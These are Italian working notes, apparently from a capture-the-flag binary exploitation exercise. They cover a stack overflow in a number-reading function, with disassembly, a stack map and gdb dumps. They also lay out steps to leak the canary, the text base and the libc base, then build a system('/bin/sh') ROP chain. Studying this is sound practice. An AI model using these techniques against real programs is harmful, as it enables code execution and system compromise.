posso modificare il leak in base a quanti numeri decido di mettere. PRENDE SOLO I NUMERI DISPARI

1 = add_numbers + 67 (valore di ritorno della get_int)

se metto che voglio inserire 6 numeri il loop non finisce mai. Questo perchè i non è mai minore di n_numbers

codice conciso della take numbers prima della printf sospetta
verificare tutto il codice per bene

		     take_numbers                                  
MOV	EAX,dword ptr [RBP + n_numbers]
SHL	RAX,0x2
LEA	RDX,[RAX + 0x8]	; somma a rax +0x8 e salva il valore dentro a RDX
MOV	RAX, 0xF
ADD	RAX,RDX
MOV	ESI,0x10
DIV	RSI		; dentro rdx ci finisce l'ultimo nimble di rax

ulimo nimble di rax = n_numbers * 2 + 0x8 + 0xf

se metto -10, -11, -12, -13 -> SEG FAULT: non sovrascrive il RIP.. legge in una zona di memoria sbagliata: se noi mettiamo come numero una zona buona invece? niente...
se metto -14, -15, -16, -17 -> STACK SMASHING: sovrascrive il canary ma è un caso.. credo? Comunque può tornare utile

EXECUTION FLOW:
prende temp_numbers
fai un if a caso
setup stack
prende primo numero
for body  write numero in buffer e inc i
for check i < temp_numbers

COME CREA LO STACK:
buffer:	(rsp+0x0f)/16*16
rsp:	rsp - ((number*4+0x08+0x0f)/0x10)*0x10
rdx:	(number*4+0x08+0x0f) % 0x10
rsi:	0x10

STACK con 14
HIGH
RBP+0x28:		&system				(buffer[19])
RBP+0x20:		&/bin/sh\x00			(buffer[18])
RBP+0x18:		sRIP (__libc_call_main/gadget)	(buffer[17]) temp_numbers = 77309411327 = 0x11FFFFFFFF = 17 / 5899345919 = 0x13ffffffff = 19
RBP+0x10		sRBP				(buffer[16)]
RBP+0x8:		sRIP (main: 0x00005555555554b2)	(buffer[15])
RBP:			sRBP				(buffer[14])
RBP-0x08:		canary				(buffer[13])
RBP-0x10:		buffer				(buffer[12]) <- se riscrivo qui, faccio un redirect della scrittura
RBP-0x18:		number				(buffer[11])
RBP-0x1c:		temp_number
RBP-0x20:		ffffdee8			(buffer[10]) <- qui metto 60129542143 = 0x0dFFFFFFFF = 13.. dovrebbe continuare a scrivere fino a 13
RBP-0x24:		i
RBP-0x28:		ffffddc0			(buffer[9]) <- viene riscritto, se metto i giusto, tipo 9 = 0x09ffffffff = 42949672959 , posso continuare e sovrascrivere temp_number..
RBP-0x30		buffer[8]					dopo fa +1 e va a 10 e sovrascrive temp_number
RBP-0x38		buffer[7]
RBP-0x40		buffer[6]
RBP-0x48		buffer[5]
RBP-0x50:		buffer[4]
RBP-0x58:		buffer[3]
RBP-0x60:		buffer[2]
RBP-0x68:		buffer[1]
RBP-0x70, RSP, buffer:	buffer[0]
LOW
0x7fffffffdd50: 0x0000000000000001      0x0000000000000000
0x7fffffffdd60: 0x0000000000000000      0x0000000000000000
0x7fffffffdd70: 0x0000000000000000      0x63240481cefbeb00
0x7fffffffdd80: 0x00007fffffffddc0      0x0000555555555234
0x7fffffffdd90: 0x0000000000000000      0x00000000ffffddc0
0x7fffffffdda0: 0x0000000effffdee8      0x0000000000000001
0x7fffffffddb0: 0x00007fffffffdd50      0x63240481cefbeb00
0x7fffffffddc0: 0x00007fffffffddd0      0x00005555555554b2

funziona il problema è che devo:
 - leak buffer: temp = 0, printo, il valore che esce è l'rbp, ci sottraggo 0x70 DONE
 - leak .text: temp = 1, printo, il valore è add_number+67 ci sommo offset che è 0x027e -> ottengo srip giusto che punta dentro a main DONE
 - leak canary -> scrivo tutto mettendo bene: i, temp e buffer e poi metto -1 quando sono sopra a buffer, stampo e l'ultimo valore è il canary DONE
 - leak libc -> sotto al sRIP c'è un indirizzo della libc scrivo e stampo fino a li, il sRBP è 0x10 + buffer + 0x70 DONE
 - 3 strade: one_gadget, chiamare execve, chiamare system
 - system: metto nel sRIP_main un gadget che mi poppa rdi, dopo quello metto l'indirizzo che contiene /bin/sh dentro a libc, e poi metto l'indirizzo a system, tutto encodato come numero

/bin/sh is at 0x1d8698 from base address of libc

perchè il simbolo di system non è a offset + base ma è a base ^ offset?

guardare bene con gdb magari attivando ASLR diventa così..
